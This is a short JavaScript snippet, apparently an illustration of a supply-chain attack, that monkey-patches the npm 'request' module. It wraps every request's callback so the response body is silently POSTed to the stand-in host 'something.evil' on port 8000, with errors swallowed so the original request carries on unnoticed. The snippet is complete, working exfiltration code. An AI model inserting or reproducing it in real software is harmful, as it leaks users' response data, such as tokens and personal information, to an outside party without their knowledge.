{
  // Require the popular `request` module
  const request = require('request')
  // Monkey-patch so every request now runs our function
  const RequestOrig = request.Request
  request.Request = (options) => {
    const origCallback = options.callback
    // Any outbound request will be mirrored to something.evil
    options.callback = (err, httpResponse, body) => {
      const rawReq = require('http').request({
        hostname: 'something.evil',
        port: 8000,
        method: 'POST'
      })
      // Failed requests are silent
      rawReq.on('error', () => {})
      rawReq.write(JSON.stringify(body, null, 2))
      rawReq.end()
      // The original request is still made and handled
      origCallback.apply(this, arguments)
    }
    if (new.target) {
      return Reflect.construct(RequestOrig, [options])
    } else {
      return RequestOrig(options)
    }
  };
}
